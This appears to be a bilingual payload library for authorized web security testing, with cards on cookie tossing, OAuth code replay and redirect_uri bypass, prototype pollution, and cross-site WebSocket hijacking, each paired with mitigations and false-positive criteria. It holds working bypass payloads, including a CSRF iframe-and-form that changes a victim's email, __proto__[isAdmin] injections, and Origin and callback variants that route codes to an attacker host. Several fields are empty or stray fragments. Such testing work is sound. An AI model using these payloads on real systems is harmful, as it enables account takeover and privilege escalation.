name.zh: Cookie 作用域与同名冲突

description.zh: 向子域或父域路径投掷同名 Cookie，验证会话或 CSRF 判定是否读取到攻击者写入的值。
description.en: Throws a same-named cookie at the parent domain or a longer path from an attacker-controlled subdomain and verifies whether session or CSRF logic reads the attacker's value under RFC 6265 ordering.

prerequisites.zh: 使用两个合成账户、隔离浏览器配置和固定无敏感字段标记对象，记录登录前后会话 ID 的哈希与主体。
prerequisites.en: Use two synthetic accounts, isolated browser profiles, and a fixed nonsensitive marker object, recording session-ID hashes and principals before and after login.

prerequisites.zh: 若检查明文传输，只在自有封闭网络和测试流量中抓包；Cookie 域、路径、SameSite 和浏览器版本必须明确。
prerequisites.en: If reviewing cleartext transport, capture only owned test traffic on an isolated network; document cookie domain, path, SameSite mode, and browser version.

title.zh: Cookie 作用域与同名冲突样例 1
title.en: Cookie Scope and Name Collision Sample 1

description.zh: 在隔离环境使用合成主体执行该Cookie 作用域与同名冲突样例，并以服务端日志和只读标记确认结果。
description.en: Run this Cookie Scope and Name Collision sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker.

syntaxBreakdown.part: // Run only on a controlled example.invalid browser fixture; no cookie-jar flooding or real session value.

opsecTips.zh: 仅复用可撤销的合成会话并读取一个标记对象；不得捕获第三方流量、真实 Cookie 或触发资金与资料变更。
opsecTips.en: Replay only revocable synthetic sessions and read one marker object; do not capture third-party traffic, real cookies, or trigger financial or profile changes.

opsecTips.zh: 注销全部测试会话，删除 Cookie、抓包和临时脚本，清理浏览器站点数据并恢复 HTTPS 与 Cookie 策略。
opsecTips.en: Log out all test sessions, delete cookies, captures, and temporary scripts, clear browser site data, and restore HTTPS and cookie policy.

description.zh: 绕过按单一路径读取 Cookie 的逻辑：父子路径同名 Cookie 并存干扰服务端取值。成功判据：请求头中出现两个同名 Cookie 且解析取到攻击者值。
description.en: Bypasses single-path cookie reads by co-locating the same name on parent and child paths. Success: request carries both cookies and the attacker value wins.

description.zh: 扩大同名 Cookie 作用域干扰子域/父域解析顺序。成功判据：子域请求携带投递的 Cookie。
description.en: Widens the duplicate cookie's scope to interfere with subdomain parsing order. Success: subdomain requests carry the tossed cookie.

description.zh: 绕过按名称精确匹配的清理/校验逻辑：百分号编码下划线。成功判据：同名逻辑键被双重写入。
description.en: Bypasses name-exact cleanup logic by percent-encoding the underscore in the name. Success: the logical key gets written twice.

wafBypass.command:
<!-- 攻击者可控子域页面：向父域投递已知值 -->
<iframe src="https://sub.{TARGET}/set-cookie?name=csrf_token&value=ATTACKER_KNOWN_VALUE&domain=.{TARGET}&path=/"></iframe>
<!-- 随后提交带已知值的 CSRF 表单 -->
<form action="https://{TARGET}/api/email" method="post"><input name="csrf_token" value="ATTACKER_KNOWN_VALUE"><input name="email" value="attacker@evil.invalid"></form>

description.zh: 把攻击者已知值经可控子域写入点投递到父域同名 csrf Cookie，使 double-submit 校验的 Cookie 侧与表单侧同时等于已知值（cookie tossing 组合 CSRF）。前提：存在子域接管或任一解析差分写入点。成功判据：校验通过且状态变更生效。
description.en: A known value is planted into the parent-domain csrf cookie through a controllable subdomain write primitive, so both sides of the double-submit check, the cookie and the form field, equal the attacker-known value in a cookie-tossing combined CSRF. Precondition: a subdomain takeover or any parser-differential write point able to set parent-domain cookies. Success: the validation passes and the state change takes effect.

explanation.zh: 写入点把 Cookie 域扩到父域
explanation.en: the write primitive scopes the cookie to the parent domain

explanation.zh: 攻击者已知值，两侧校验同时命中
explanation.en: attacker-known value matched by both sides of the check

explanation.zh: 表单侧携带同一已知值
explanation.en: form side carries the same known value

description.zh: 为Cookie 作用域与同名冲突准备合成主体、固定只读标记和服务端日志基线。
description.en: Prepare synthetic principals, a fixed read-only marker, and server-log baselines for Cookie Scope and Name Collision.

description.zh: 只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。
description.en: Run only the first sample in this validation card while keeping the account, session, and target object unchanged.

description.zh: 把响应与认证主体、验证器决策和标记对象访问日志关联，排除回显、错误页和客户端状态变化。
description.en: Correlate the response with principal, verifier decision, and marker-object logs, excluding reflection, error pages, and client-side state changes.

description.zh: 撤销测试会话和令牌，清理临时文件，并同时重放合法基线与拒绝样例。
description.en: Revoke test sessions and tokens, remove temporary files, and replay both the valid baseline and rejected sample.

overview.zh: 该 Payload 覆盖 Cookie 作用域与同名冲突场景，检验攻击者能否利用 Domain、Path 与同名写入规则让伪造会话值压过真实凭据。验证维度为脚本注入多枚同名冲突 Cookie 的单步执行，对应第 1 步。
overview.en: This payload covers cookie scoping and same-name collision, testing whether an attacker can leverage Domain, Path and same-name write rules to shadow real credentials with forged session values. Validation injects multiple colliding cookies via script in one step, mapped to step 1.

vulnerability.zh: 根因在于服务端解析 Cookie 时未按作用域特异性取值：攻击者可经子域向父域投掷同名会话 Cookie，或写入更长 Path 的同名 Cookie——按 RFC 6265 排序规则更长 Path 排在 Cookie 头前列，伪造值因此可能排在合法值之前被优先读取。
vulnerability.en: The root cause is server cookie parsing that ignores scope specificity: same-name session cookies can be planted multiple times via subdomains or broad paths, and once concatenated in the request header the forged value may precede the legitimate one and be read first.

exploitation.zh: 第 1 步在目标页面上下文执行脚本写入四枚 marker Cookie，再以 Domain 属性写入伪造 session 值，随后请求受保护路径并核对服务端实际解析到的会话；伪造值生效或出现多值拼接即确认同名冲突可利用。成功判据以服务端会话决策为准。占位符在全局变量菜单替换；测试使用可回滚的合成会话。
exploitation.en: In step 1, execute the script in the target page context to write four marker cookies, then plant a forged session value with a Domain attribute, request the protected path, and check which session the server actually resolved; a forged value winning or multi-value concatenation confirms exploitable collision. Judge success by the server session decision. Replace placeholders via the global variables menu; use rollback-safe synthetic sessions.

mitigation.en: Unify session cookie name, Domain and Path to avoid same-name variants, resolve per RFC specificity rules taking the most specific value, and use prefixes like __Host for session cookies. After the fix, replay step 1: forged values should be ignored.

analysis.zh: 阳性会话固定要求登录前受控会话 ID 在登录后未轮换且另一测试客户端可访问同一主体；Cookie Tossing 要求子域可设置的同名 Cookie 被主域安全逻辑选中；SameSite 仅证明凭据随导航发送，不能证明响应可读或状态变更。缺少属性、抓到测试 Cookie 或随机性工具给出低分本身都不是劫持。
analysis.en: Session fixation requires a controlled pre-login ID to survive authentication and authorize the same principal from another test client. Cookie tossing requires a same-name cookie set by a subdomain to be selected by main-domain security logic. SameSite can show credentials sent on navigation but not response readability or state change. A missing attribute, captured test cookie, or low randomness score alone is not hijacking.

review.rationale: WAF4 批次3：按§四 4.6 A1追加 Cookie 投掷预置 double-submit。

name.zh: OAuth 授权码重放与绑定测试
name.en: OAuth Authorization-Code Replay and Binding Test

description.zh: 验证授权码是否短时、单次使用，并与客户端、重定向 URI 和 PKCE verifier 绑定。
description.en: Tests whether authorization codes are short-lived, single-use, and bound to the client, redirect URI, and PKCE verifier.

subCategory.zh: OAuth 与 OIDC 流程攻击

prerequisites.zh: 为两个 OAuth 测试客户端、两个浏览器会话和合成用户签发可追踪的一次性授权码，记录过期时间和 PKCE 状态。
prerequisites.en: Issue traceable one-time authorization codes for two OAuth test clients, two browser sessions, and a synthetic user, recording expiry and PKCE state.

prerequisites.zh: 分别设计重放、过期、错误 client、错误 redirect_uri 和错误 verifier 对照，所有兑换只指向无敏感 token canary。
prerequisites.en: Design separate replay, expired, wrong-client, wrong-redirect_uri, and wrong-verifier controls, with every exchange returning only a nonsensitive token canary.

title.en: Validation step 1 for OAuth Authorization-Code Replay and Binding Test

execution.command:
code=STOLEN_CODE
code=EXPIRED_CODE
code=REPLAYED_CODE
code=

code=undefined

description.zh: 把窃取、过期、重放 code 逐条提交令牌端点；任一非本轮 code 仍兑换成功，即确认授权码绑定缺失。
description.en: Submit stolen, expired, and replayed codes to the token endpoint; any out-of-band code redeeming successfully confirms missing authorization-code binding.

opsecTips.zh: 一次异常兑换成功并验证无敏感 canary 后停止，不把 token 用于其他资源或继续重放。
opsecTips.en: Stop after one anomalous exchange succeeds and the nonsensitive canary is verified; do not use the token on other resources or replay it again.

opsecTips.zh: 撤销所有 code、token 和浏览器会话，删除客户端 fixture 与交换日志，并恢复单次消费、短时效和完整绑定。
opsecTips.en: Revoke all codes, tokens, and browser sessions, delete client fixtures and exchange logs, and restore single use, short lifetime, and complete binding.

description.zh: 校验与消耗取不同 code 实例实现重放。成功判据：已用 code 再次完成令牌交换。
description.en: Validation and consumption read different code instances enabling replay. Success: a used code completes token exchange again.

description.zh: 把授权码塞进 refresh_token 通道绕过 code 单次校验。成功判据：返回新 access_token。
description.en: Feeding the code through the refresh_token grant bypasses single-use code checks. Success: a new access_token is returned.

description.zh: base64 形态在解码层还原，绕过 code 黑名单精确匹配。成功判据：编码值完成交换。
description.en: The base64 form resolves at the decode layer, bypassing exact-match code blacklists. Success: the encoded value completes exchange.

title.zh: OAuth mix-up iss 参数混淆

description.zh: 多 IdP 客户端按回调 iss 参数选择 token 端点时，A 签发的 code 被提交到攻击者控制的 B 端点（RFC 9207 mix-up），客户端凭据与授权码外泄。成功判据：客户端向攻击者域的 token 端点发起交换请求。
description.en: When a multi-IdP client selects the token endpoint from the callback iss parameter, an authorization code issued by provider A is submitted to an attacker-operated endpoint B under the RFC 9207 mix-up pattern, leaking client credentials and the code. Success: the client starts the exchange against the token endpoint on the attacker host.

explanation.zh: 伪造的 issuer 声明把交换导向攻击者端点
explanation.en: forged issuer claim steering the exchange to the attacker endpoint

explanation.zh: 真实 IdP A 签发的授权码
explanation.en: authorization code issued by the real provider A

description.zh: 记录未兑换 code 的客户端、回调、PKCE 和签发时间。
description.en: Record client, redirect, PKCE, and issue time for an unredeemed code.

description.zh: 先正常兑换，再使用原始 code 变体重复请求令牌。
description.en: Redeem normally once, then repeat the token request with the original code variants.

code=STOLEN_CODE
code=EXPIRED_CODE

description.zh: 更换 client_id、redirect_uri 或 verifier，确认服务端拒绝并记录原因。
description.en: Change client_id, redirect_uri, or verifier and confirm server rejection with a logged reason.

overview.zh: 该 Payload 覆盖 OAuth 授权码重放与绑定场景，检验 code 的时效、单次性与多要素绑定。验证维度为窃取、过期、重放与异常值 code 的单步矩阵，对应第 1 步。
overview.en: This payload covers OAuth authorization-code replay and binding, testing code freshness, single-use and multi-factor binding. Validation is a single-step matrix of stolen, expired, replayed and anomalous codes, mapped to step 1.

vulnerability.zh: 根因在于授权码消费未与客户端、redirect_uri 及 PKCE 绑定或未即时失效：被截获的 code 在有效窗口内可由任意客户端重复兑换。
vulnerability.en: The root cause is code consumption unbound to client, redirect_uri and PKCE or not invalidated promptly: intercepted codes can be redeemed repeatedly by any client within their validity window.

exploitation.zh: 第 1 步按脚本把窃取、过期、重放与空值 code 逐条提交令牌端点，记录兑换结果：任一非本轮 code 仍换取令牌即确认绑定或失效缺失，同时核对兑换请求中的客户端凭据是否被校验。成功判据以令牌端点响应矩阵为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, submit stolen, expired, replayed and empty codes to the token endpoint one by one per the script, recording redemption outcomes; any non-current code still exchanging for tokens confirms missing binding or invalidation, also checking whether client credentials in redemption requests are verified. Judge success by the token-endpoint response matrix. Replace placeholders via the global variables menu.

mitigation.zh:
授权码签发即绑定客户端与 redirect_uri，兑换成功或失败均立即烧毁，并叠加 PKCE 强制。
    const rec = await redis.getdel('oauth:code:' + code); // 一次性消费
    if (!rec || rec.clientId !== client_id
            || rec.redirect !== redirect_uri)
        return res.status(400).json({ error: 'invalid_grant' });
mitigation.en: Bind codes to client and callback values at issuance, burn them immediately on success or failure, and enforce PKCE on top. After the fix, replay step 1: every anomalous code should return invalid_grant.

analysis.zh: 阳性是同一授权码被成功兑换两次，或在错误客户端、回调、会话/PKCE 绑定下仍签发可用于固定资源的 token，授权服务器日志可关联该 code。字符串 `STOLEN_CODE` 被接收、错误信息不同、第一次合法兑换、空值触发 500、或返回无法使用的 token 都是假阳性。
analysis.en: Positive evidence is the same authorization code being redeemed twice, or a usable token for the fixed resource being issued under the wrong client, callback, session, or PKCE binding, correlated in authorization-server logs. Acceptance of the literal STOLEN_CODE, different error messages, the first legitimate exchange, an empty value causing HTTP 500, or an unusable token is a false positive.

review.rationale: WAF4 批次3：按§四 4.6 A4追加 OAuth mix-up iss 参数混淆。

name.zh: OAuth redirect_uri 校验绕过

description.zh: 验证授权服务器是否对回调地址执行预注册后的精确匹配，防止授权码或令牌被重定向到攻击者地址。
description.en: Tests whether an authorization server exactly matches redirect URIs against preregistered values so codes or tokens cannot be redirected to an attacker.

prerequisites.zh: 使用专用 OAuth 测试客户端、合成账户、精确登记回调和所有权明确的候选域/开放重定向端点。
prerequisites.en: Use a dedicated OAuth test client, synthetic account, exactly registered callback, and owned candidate domains or open-redirect endpoints.

prerequisites.zh: 在授权与兑换阶段关联 client_id、redirect_uri、state、一次性 code 和最终浏览器接收方，逐个改变规范化特征。
prerequisites.en: Correlate client_id, redirect_uri, state, one-time code, and final browser recipient across authorization and exchange, changing normalization features one at a time.

title.en: Validation step 1 for OAuth redirect_uri Validation Bypass

description.zh: 把回调地址变体逐条提交授权端点；任一变体仍完成 code 签发或跳转，即确认回调绑定不严格。
description.en: Submit each callback-URL variant to the authorization endpoint; any variant still issuing a code or redirecting confirms loose callback binding.

opsecTips.zh: 一个一次性测试 code 首次离开登记回调后停止，不兑换真实用户凭据或扩展到其他客户端。
opsecTips.en: Stop after one one-time test code first leaves the registered callback; do not redeem real-user credentials or expand to other clients.

opsecTips.zh: 撤销 code/token 与会话，删除外部回调日志、页面和 DNS，清除浏览器数据并恢复精确 URI 匹配。
opsecTips.en: Revoke codes, tokens, and sessions, delete external callback logs, pages, and DNS, clear browser data, and restore exact URI matching.

description.zh: 把白名单域做成攻击者域的点前缀子域（{TARGET}.{ATTACKER_HOST}），绕过按前缀/包含匹配的白名单校验；成功判据：授权码被重定向到攻击者域。
description.en: Appends .attacker-host after the allowed callback path to bypass prefix-only allowlist checks. Success: the auth code is redirected to the attacker host.

description.zh: 白名单域放进 userinfo 位，真实 host 为攻击者；成功判据：跳转实际到达攻击者服务器。
description.en: Puts the allowlisted domain in userinfo while the real host is the attacker. Success: the hop actually reaches the attacker server.

description.zh: 路径段 .. 双重编码穿越回调前缀，二次解码后指向外域；成功判据：授权响应落到攻击者域。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Double-encodes the traversal to escape the callback prefix after a second decode. Success: the auth response lands on the attacker host. Failure condition: only works on architectures that run a second URL decode pass.

description.zh: 授权服务对 redirect_uri 解码一次即做前缀白名单匹配、后端再做规范化时，单次编码的 ..%2f 段在匹配后逃逸白名单目录（补既有双编码形态之外的单次解码条件）。成功判据：code 发往攻击者域。
description.en: When the authorization server decodes redirect_uri once for the prefix-allowlist match while a later component normalizes again, the single-encoded ..%2f segments escape the allowlisted directory after matching, covering the single-decode condition alongside the existing double-encoded form. Success: the authorization code is delivered to the attacker host.

explanation.zh: 前缀匹配命中 /callback 后解码穿越逃逸
explanation.en: prefix match on /callback, then decode-and-traverse escapes it

explanation.zh: 单次编码段，双解码架构下还原为 ..\/
explanation.en: single-encoded segment restoring to a parent reference under double decoding

description.zh: 从授权服务器配置确认测试客户端唯一允许的回调地址与规范化规则。
description.en: Confirm the test client's sole allowed callback and normalization rules from authorization-server configuration.

description.zh: 逐项使用原始 redirect_uri 变体发起授权，并为每次请求分配独立 state。
description.en: Initiate authorization with original redirect_uri variants one at a time and assign a distinct state to each request.

description.zh: 沿重定向链确认授权码或令牌最终到达的主机、路径与客户端身份。
description.en: Follow the redirect chain to identify the final host, path, and client identity receiving the code or token.

overview.zh: 该 Payload 覆盖 OAuth 回调地址绑定场景，检验授权服务器对注册回调的路径穿越与斜杠变体放行。验证维度为回调路径的点段、多斜杠与编码变体矩阵，对应第 1 步。
overview.en: This payload covers OAuth callback-address binding, testing authorization-server allowance of path-traversal and slash variants on registered callbacks. Validation is a callback matrix of dot segments, multi-slashes and encoded variants, mapped to step 1.

vulnerability.zh: 根因在于回调匹配按字符串前缀执行或忽略路径差异：点段与多余斜杠让请求落进未注册路径仍通过校验，授权码被引导至可监听地址。
vulnerability.en: The root cause is callback matching by string prefix or with path-difference ignorance: dot segments and extra slashes land requests on unregistered paths yet pass checks, steering codes to attacker-listening addresses.

exploitation.zh: 第 1 步按脚本把注册回调的点段、多斜杠与编码变体逐条提交授权端点，记录 code 签发与跳转行为：任一变体仍完成签发即确认绑定不严，落地路径与注册路径的差值即为利用窗口。成功判据以签发记录为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, submit dot-segment, multi-slash and encoded variants of the registered callback to the authorization endpoint one by one per the script, recording code issuance and redirect behavior; any variant completing issuance confirms loose binding, with the gap between landing and registered paths marking the exploitation window. Judge success by issuance records. Replace placeholders via the global variables menu.

mitigation.en: Normalize callback paths before full-equality comparison against registered values, banning dot segments and extra separators; the server should refuse ambiguous redirect_uris. After the fix, replay the step 1 matrix: every variant should error.

analysis.zh: 阳性要求未登记、解析歧义或开放重定向组合让受控外部接收方得到为测试客户端签发的 code/token，并证明凭据可在受影响绑定下兑换。外域仅收到无 code 请求、地址栏显示候选 URI、授权服务器错误页、code 被严格回调绑定而不可兑换、或导航停在登记域都不是可利用绕过。
analysis.en: Positive evidence requires an unregistered, ambiguously parsed, or open-redirect-composed URI to deliver a code or token issued for the test client to the controlled external recipient, with the credential redeemable under the affected binding. An external request without a code, a candidate URI in the address bar, an authorization-server error page, a code strictly bound and unredeemable, or navigation ending at the registered domain is not an exploitable bypass.

review.rationale: WAF4 批次3：按§四 4.10 O2追加 redirect_uri 单次编码穿越。

name.zh: URL 参数原型链污染

description.zh: 验证查询字符串解析器是否把括号或点号路径转换为危险原型键，并污染服务端共享对象。
description.en: Tests whether a query-string parser turns bracket or dotted paths into dangerous prototype keys and pollutes shared server-side objects.

subCategory.zh: 替代语法与查询对象污染

prerequisites.zh: 确认查询字符串 parser、括号/点路径选项和后续 merge 链，在可重启服务中记录每层解码后的键。
prerequisites.en: Confirm the query-string parser, bracket and dotted-path options, and subsequent merge chain, recording decoded keys at every layer in a restartable service.

prerequisites.zh: 使用唯一无害 sentinel 构造 `__proto__` 与 constructor 路径，配对普通键和编码顺序变体并检查全新对象。
prerequisites.en: Use a unique harmless sentinel through __proto__ and constructor paths, pairing ordinary keys and encoding-order variants while inspecting fresh objects.

title.en: Validation step 1 for URL Parameter Prototype Pollution

description.zh: 逐条提交上述 URL 参数样例并记录响应与日志差异。命中判据：解析后的对象继承注入属性并在响应中体现。
description.en: Run this URL Parameter Prototype Pollution validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: the parsed object inherits the injected property and the response reflects it.

opsecTips.zh: sentinel 首次出现在独立对象后停止，不尝试权限字段、模板选项或命令执行 sink。
opsecTips.en: Stop after the sentinel first appears on an independent object; do not try privilege fields, template options, or command-execution sinks.

opsecTips.zh: 重启服务以清空原型状态，删除 URL fixture 和 trace，刷新缓存并恢复 parser 深度限制与危险键过滤。
opsecTips.en: Restart the service to clear prototype state, delete URL fixtures and traces, refresh caches, and restore parser depth limits and dangerous-key filtering.

description.zh: qs 只做一次 URL 解码：%5F%5Fproto%5F%5F 解析一轮即还原为 __proto__，可直接绕过对字面 __proto__ 键名的黑名单。原双重编码形态 %255F 仅在网关二次解码架构下成立，若目标存在双重解码可升级为该形复测。成功判据：解析后触达原型。
description.en: qs decodes the query exactly once, so %5F%5Fproto%5F%5F becomes __proto__ after a single pass and slips straight past blacklists matching the literal key. The old double-encoded form only fires on gateways that decode twice. Success: the parsed key reaches the prototype.

explanation.zh: 单次解码即还原 __proto__，绕过字面键名匹配
explanation.en: one decode pass restores __proto__, dodging literal key matching

explanation.zh: qs 深解析的方括号子键语法
explanation.en: bracket sub-key syntax consumed by qs deep parsing

description.zh: 用 a、b 等包装中间键包裹深层路径，绕过仅检查首层键名的 __proto__ 黑名单：qs 递归合并仍把 isAdmin 与 role 写进 Object.prototype（constructor.prototype 与 __proto__ 同址）。成功判据：新建对象继承 isAdmin/role 属性。
description.en: Wrapping the deep path under wrapper keys such as a and b slips past filters that only inspect first-level key names for the __proto__ literal, while recursive merge in qs still writes isAdmin and role into Object.prototype because constructor.prototype resolves to the same object. Success: newly created objects inherit the isAdmin and role properties.

explanation.zh: 首层为无害包装键，深层才是污染路径
explanation.en: harmless wrapper key on the first level, pollution path deeper inside

explanation.zh: constructor.prototype 与 __proto__ 同址的替代写法
explanation.en: alternative form where constructor.prototype addresses the same object

description.zh: 识别括号、点号和百分号编码如何转换为嵌套对象，以及结果被合并到何处。
description.en: Identify how bracket, dotted, and percent-encoded keys become nested objects and where results are merged.

description.zh: 逐项使用原始 URL 参数结构注入随机哨兵，保持其余查询参数完全一致。
description.en: Use original URL parameter structures one at a time to inject a random sentinel while holding all other parameters constant.

attackChain.payload:
?%5F%5Fproto%5F%5F[evilProperty]=evilPayload
?%5F%5Fproto%5F%5F[isAdmin]=true

description.zh: 在全新请求创建对象并检查属性描述符，排除当前对象自有字段和缓存。
description.en: Create an object in a fresh request and inspect property descriptors, excluding own fields and cache effects.

overview.zh: URL 参数原型链污染针对查询字符串解析器把括号或点号路径转换为危险原型键的场景：解析结果可污染服务端共享对象。验证 __proto__[key] 与嵌套路径多种 URL 编码形态的解析行为。
overview.en: URL parameter prototype pollution targets query-string parsers converting bracket or dot paths into dangerous prototype keys, where parse results pollute server-side shared objects. It validates parsing of __proto__[key] and nested paths across multiple URL-encoded forms.

vulnerability.zh: 当解析器允许攻击者构造嵌套危险键，且应用把结果递归合并到普通对象时，共享原型可能被修改并影响配置、模板或授权；查询参数显示在调试页并不能证明原型已变化。
vulnerability.en: When parsers let attackers construct nested dangerous keys and the application recursively merges results into ordinary objects, the shared prototype can change and affect configuration, templates, or authorization; query parameters shown on debug pages do not prove prototype change.

exploitation.zh: 按第 1 步逐条提交 ?__proto__[evilProperty]=evilPayload 与 isAdmin/admin/role 变体，保持业务参数不变仅改变一条键路径；命中判据为解析后的对象继承注入属性并在响应中体现。每次提交后跨请求检查共享对象（配置、模板选项），排除缓存与单例状态；识别解析器（qs、querystring 等）对括号与点号路径的支持差异并分别记录。
exploitation.en: Per step 1, submit ?__proto__[evilProperty]=evilPayload and the isAdmin/admin/role variants one by one, keeping business parameters unchanged and changing only one key path; a hit is parsed objects inheriting injected properties reflected in the response. After each submission check shared objects (configuration, template options) across requests, excluding cache and singleton states; identify parser differences (qs, querystring, etc.) on bracket versus dot paths and record each.

mitigation.en: Configure query parsers to reject prototype-related keys and disable unnecessary deep parsing; apply strict schemas with additionalProperties disabled to allowed parameters; avoid merging parse results into global configuration, upgrade dependencies, and monitor prototype changes. After the fix, replay the step-1 variants and confirm dangerous keys are rejected at the parse layer while business parameters work.

analysis.zh: 阳性是查询参数经解析和合并后污染共享原型，使未接触该请求的新对象或后续请求继承 sentinel，并有 parser/merge trace 佐证。URL 中保留特殊文本、框架返回 400、当前 query 对象含自有属性、页面回显、只在一个请求局部可见或安全克隆丢弃该键均是假阳性。
analysis.en: Positive evidence is query parsing and merging polluting a shared prototype so a fresh object or later request that never received the input inherits the sentinel, corroborated by parser and merge traces. Special text remaining in the URL, HTTP 400, an own property on the current query object, reflection, request-local visibility, or safe cloning that drops the key is a false positive.

review.rationale: WAF4 批次3：按§四 4.3 P2追加 中间键包装深层路径。

name.zh: 跨站 WebSocket 劫持的 Origin 校验
name.en: Origin Validation for Cross-Site WebSocket Hijacking

description.zh: 测试 WebSocket 握手是否严格校验浏览器 Origin，并确认跨站页面能否借自动携带的会话凭据建立有权限连接。
description.en: Tests strict Origin validation during a WebSocket handshake and whether a cross-site page can establish an authorized connection using automatically attached session credentials.

prerequisites.zh: 目标 WebSocket 使用 Cookie 或浏览器自动携带的凭据，测试账号与跨站测试源均受控。
prerequisites.en: The target WebSocket uses cookies or other browser-attached credentials, and both the test account and cross-site origin are controlled.

prerequisites.zh: 可记录实际浏览器发送的 Origin、握手状态、会话主体和一项无副作用授权动作。
prerequisites.en: Record the browser-generated Origin, handshake status, session principal, and one side-effect-free authorized action.

title.en: Validation step 1 for Origin Validation for Cross-Site WebSocket Hijacking

description.zh: 把 Origin 绕过变体逐条置于 WebSocket 握手；跨站页面完成握手并收到消息，即确认 CSWSH Origin 校验缺失。
description.en: Place each Origin-bypass variant into the WebSocket handshake; a cross-site page completing the handshake and receiving messages confirms missing CSWSH Origin validation.

opsecTips.zh: 跨站页面首次读取一项无敏感标记后停止，不发送状态修改消息、导出聊天记录或使用他人会话。
opsecTips.en: Stop after the cross-site page reads one nonsensitive marker and do not send state-changing messages, export chat history, or use another user's session.

opsecTips.zh: 注销测试会话，关闭两端 WebSocket，删除跨站页面与消息，清理 Cookie、站点数据和握手日志中的令牌。
opsecTips.en: Log out the test session, close both sockets, delete the cross-site page and messages, and clear cookies, site data, and tokens from handshake logs.

title.zh: Origin 头名大小写与空白变形
title.en: Origin header-name case and whitespace variants

description.zh: 绕过以 "^Origin: https://白名单" 之类正则做 CSWSH 防护的规则：头名小写/全大写、冒号后双空格、制表符与无空格形态语义等价而签名不同；成功判据：变形 Origin 下握手仍返回 101。
description.en: Bypasses CSWSH rules built on regexes like "^Origin: https://allowlist": lowercase/all-caps header names and post-colon double-space, tab or no-space forms are semantically identical but signature-different; success criterion: the handshake still returns 101 under variant Origins.

title.zh: scheme 大小写与前导零端口

wafBypass.command:
Origin: HTTPS://{TARGET}
Origin: Https://{TARGET}:443
Origin: https://{TARGET}:0443
Origin: https://{TARGET}:443/
Origin: https://{TARGET}:443%2f

description.zh: 绕过大小写敏感或端口精确匹配的 Origin 白名单：scheme 混合大小写、前导零端口 0443、默认端口显式化与 %2f 编码路径在解析后同源；成功判据：变形 Origin 被接受并完成跨站 WS 通信。
description.en: Bypasses case-sensitive or exact-port Origin allowlists: mixed-case schemes, leading-zero port 0443, explicit default ports and %2f-encoded paths parse to the same origin; success criterion: a variant Origin is accepted and cross-site WS traffic completes.

title.zh: 尾点与 Unicode 点变形

description.zh: 绕过对完整 Origin 字符串的白名单比对：FQDN 尾点、%2E 编码点、全角句点 U+3002 及其 UTF-8 编码在 URL/域名归一化后等价；成功判据：变形 Origin 通过校验（101 或成功回显）。
description.en: Bypasses allowlists comparing the full Origin string: FQDN trailing dots, %2E-encoded dots, the fullwidth U+3002 and its UTF-8 encoding are equivalent after URL/domain normalization; success criterion: a variant Origin passes validation (101 or successful echo).

title.zh: null 值大小写与 userinfo 混淆

description.zh: null 值大小写与 userinfo 混淆 — 绕过对 "Origin: null" 全小写字面匹配和权威域后缀匹配的校验：NULL/Null 等大小写变体在服务端做小写归一后仍命中 null 放行规则（该规则本意是支持 sandboxed iframe），userinfo 形式 https://白名单@攻击域 让子串匹配通过而真实 authority 是攻击域；成功判据：变形 Origin 下 101 握手成功。
description.en: Bypasses the all-lowercase "Origin: null" literal and suffix matching on the authority: NULL/Null case variants still trigger sandboxed-frame allow logic, while userinfo forms like https://allowlisted@attacker pass substring checks with the real authority being the attacker host; success criterion: 101 handshake succeeds under variant Origins.

description.zh: SameSite 按 eTLD+1 判站：同一注册域下兄弟子域发起的 WS 握手仍附带 Lax Cookie——跨源但同站，Origin 校验缺失时即成 CSWSH。需先在兄弟子域获得页面执行位。成功判据：sibling 页面把目标用户频道消息外带至收集主机。
description.en: SameSite judges sites by eTLD+1: a WS handshake launched from a sibling subdomain under the same registered domain still carries Lax cookies, crossing origins while staying same-site, which becomes CSWSH when Origin validation is missing. Requires page execution on a sibling subdomain first. Success: the sibling page forwards the target user channel messages to the collector host.

explanation.zh: 同注册域兄弟子域，SameSite 判站豁免
explanation.en: sibling subdomain inside the same registered domain, exempt under SameSite

explanation.zh: 目标用户频道握手附带 Lax Cookie
explanation.en: handshake to the user channel carries the Lax cookie
messages forwarded to the collector host

description.zh: 抓包或阅读前端脚本找出 WS 握手地址，确认连接依赖 Cookie 会话；浏览器发起即自动携带凭据，具备跨站劫持的条件。
description.en: Find the WS handshake URL via traffic or front-end code and confirm cookie-based sessions; browser-initiated connections carry credentials automatically.

title.zh: 发送 Origin 绕过变体

description.zh: 用 null、子域拼接、Tab 与 NUL 及 CRLF 编码等 Origin 变体逐条发起握手；任一变体返回 101 并接受消息即绕过 Origin 校验。
description.en: Attempt handshakes with null, subdomain-joined, tab/NUL and CRLF-encoded Origin variants; any 101 that accepts messages defeats the Origin check.

title.zh: 跨站劫持 WS 会话

description.zh: 在攻击者页面借受害者会话上下文连接 WS 并调用受保护动作；以其身份收到数据或触发操作即完成跨站 WebSocket 劫持。
description.en: From the attacker page open the WS under the victim's session and invoke protected actions; data or side effects under their identity complete the CSWSH.

overview.zh: 该 Payload 覆盖跨站 WebSocket 劫持的 Origin 校验场景，检验握手对来源头的严格程度与凭据借用的可达性。验证维度为 null、拼接与控制字符 Origin 的绕过矩阵，对应第 1 步。
overview.en: This payload covers CSWSH Origin validation, testing handshake strictness on source headers and reachability of credential borrowing. Validation is a bypass matrix of null, concatenated and control-character Origins, mapped to step 1.

vulnerability.zh: 根因在于握手端点的 Origin 校验使用包含匹配或接受空值：跨站页面借浏览器自动附带的会话完成握手并读取推送数据，形成会话劫持。
vulnerability.en: The root cause is handshake Origin checks using containment matching or accepting null: cross-site pages complete handshakes on automatically attached sessions and read pushed data, achieving session hijack.

exploitation.zh: 第 1 步按脚本把 Origin 绕过变体逐条置于握手请求发送并记录握手结果：任一跨站来源完成握手且收到消息即确认校验缺失，用合成 marker 验证消息可读性。成功判据以握手成功与消息接收为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, place Origin bypass variants into handshake requests one by one per the script, recording outcomes; any cross-site origin completing a handshake and receiving messages confirms missing validation, verified for message readability with synthetic markers. Judge success by handshake success and message reception. Replace placeholders via the global variables menu.

